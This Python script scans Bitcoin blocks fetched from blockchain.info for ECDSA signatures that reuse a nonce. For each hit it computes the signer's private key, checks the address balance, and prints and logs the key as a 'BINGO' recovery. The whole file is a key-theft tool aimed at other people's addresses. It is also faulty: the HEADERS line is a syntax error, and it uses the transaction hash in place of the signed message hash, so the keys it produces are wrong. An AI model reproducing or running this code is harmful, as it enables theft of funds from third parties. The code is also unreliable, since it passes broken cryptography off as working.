import os
import secrets
import threading
import time
import sys
import hashlib
import base58
import requests
import collections
import multiprocessing
from ecdsa import SECP256k1, numbertheory

# --- CONSTANTS ---
# ECDSA Curve Order
N = SECP256k1.order
HEADERS = {'User-Agent': 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36''}

def get_balance(address):
    """Fetches the current balance of an address in BTC."""
    try:
        res = requests.get(f"https://blockchain.info/rawaddr/{address}", timeout=10, headers=HEADERS).json()
        satoshis = res.get('final_balance', 0)
        return satoshis / 100000000
    except Exception:
        return 0.0

def solve_privkey(r_hex, s1_hex, z1_hex, s2_hex, z2_hex):
    """Solves ECDSA R-Reuse vulnerability (Key Recovery)."""
    try:
        r = int(r_hex, 16)
        s1 = int(s1_hex, 16)
        z1 = int(z1_hex, 16)
        s2 = int(s2_hex, 16)
        z2 = int(z2_hex, 16)
        
        num = (z1 * s2 - z2 * s1) % N
        den = (r * (s1 - s2)) % N
        
        if den == 0: return None
        
        inv_den = numbertheory.inverse_mod(den, N)
        d = (num * inv_den) % N
        return hex(d)[2:].zfill(64)
    except Exception:
        return None

def fetch_block_with_retry(height, session):
    """Fetches block data with exponential backoff for rate limits."""
    url = f"https://blockchain.info/rawblock/{height}"
    while True:
        try:
            response = session.get(url, headers=HEADERS, timeout=15)
            if response.status_code == 200: return response.json()
            time.sleep(10)
        except Exception: 
            time.sleep(5)

def worker_task(start, end, worker_id, bingo_list):
    """Main worker thread for blockchain analysis."""
    session = requests.Session()
    local_tracker = collections.defaultdict(lambda: collections.defaultdict(list))
    
    print(f"\033[1;32m[*] CORE-{worker_id} ACTIVE: Scanning range {start} - {end}...\033[0m")
    
    for block_height in range(start, end):
        data = fetch_block_with_retry(block_height, session)
        
        if data and 'tx' in data:
            for tx in data['tx']:
                tx_hash = tx.get('hash')
                for inp in tx.get('inputs', []):
                    addr = inp.get('prev_out', {}).get('addr', 'Unknown')
                    script = inp.get('script', '')
                    
                    # Detect ECDSA signature pattern
                    if '304' in script:
                        start_pos = script.find('304')
                        r_val = script[start_pos+10:start_pos+74]
                        s_val = script[start_pos+80:start_pos+144]
                        
                        if len(r_val) == 64:
                            local_tracker[addr][r_val].append({'s': s_val, 'z': tx_hash})
                            
                            # Check for signature reuse (R-Reuse)
                            if len(local_tracker[addr][r_val]) >= 2:
                                bingo_list.append(1)
                                b_no = len(bingo_list)
                                m = local_tracker[addr][r_val]
                                
                                priv_key = solve_privkey(r_val, m[-2]['s'], m[-2]['z'], m[-1]['s'], m[-1]['z'])
                                bakiye = get_balance(addr)

                                print(f"\n\n\033[1;41m  BINGO #{b_no} RECOVERED!  \033[0m")
                                print(f"\033[1;31m{'='*65}")
                                print(f"TARGET ADDR : {addr}")
                                print(f"BALANCE     : {bakiye} BTC")
                                print(f"PRIV KEY    : {priv_key}")
                                print(f"{'='*65}\033[0m\n")
                                
                                with open("final_recovery_full.txt", "a") as f:
                                    f.write(f"BINGO {b_no} | ADDR: {addr} | BALANCE: {bakiye} | KEY: {priv_key}\n")

if __name__ == "__main__":
    start_block, end_block, num_cores = 230000, 350000, 4 # Adjusted for mobile CPU
    manager = multiprocessing.Manager()
    bingo_list = manager.list()
    
    os.system('clear')
    print(f"\033[1;36m{'='*65}")
    print(f"   ARKEON SIGNATURE MASTER v10.2 - RECOVERY MODE")
    print(f"   STATUS: ONLINE | CORES: {num_cores} | MODE: R-REUSE ANALYSIS")
    print(f"{'='*65}\033[0m\n")

    processes = []
    step = (end_block - start_block) // num_cores
    
    for i in range(num_cores):
        p = multiprocessing.Process(target=worker_task, args=(start_block+(i*step), start_block+((i+1)*step), i, bingo_list))
        processes.append(p)
        p.start()

    try:
        for p in processes: p.join()
    except KeyboardInterrupt:
        for p in processes: p.terminate()
        print("\n\033[1;33m[!] System shutdown.\033[0m")
